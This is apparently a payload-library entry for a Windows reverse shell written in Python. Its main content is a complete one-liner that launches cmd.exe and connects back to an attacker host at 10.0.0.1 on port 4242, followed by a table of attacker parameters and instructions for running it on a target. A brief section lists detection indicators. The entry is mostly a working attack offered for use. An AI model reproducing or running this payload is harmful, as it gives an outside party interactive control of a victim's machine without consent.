---
id: e256f627-f40d-463d-b23c-ddc9da7ec518
type: code
language: Python
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - reverse-shell
  - python
  - windows
  - cmd
validated: true
---

# Python-Windows-Reverse-Shell-Threading-CMD

## Code

```python
python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('10.0.0.1',4242));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()"
```

## Description

Windows-compatible reverse shell spawning cmd.exe via Popen, using threads for reading/writing to socket for bidirectional communication.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $ATTACKER_IP | Attacker's IPv4 address | 10.0.0.1 |
| $ATTACKER_PORT | Attacker's listening port | 4242 |

## Usage

Execute via python.exe on Windows target (e.g., in PowerShell). Listener on attacker for CMD shell.

## Detection

- Python spawning cmd.exe with pipes.
- Threading + socket in Python on Windows.
- Outbound connections from python.exe.

## Related

- [[procedures/Establish-Python-Reverse-Shell]]
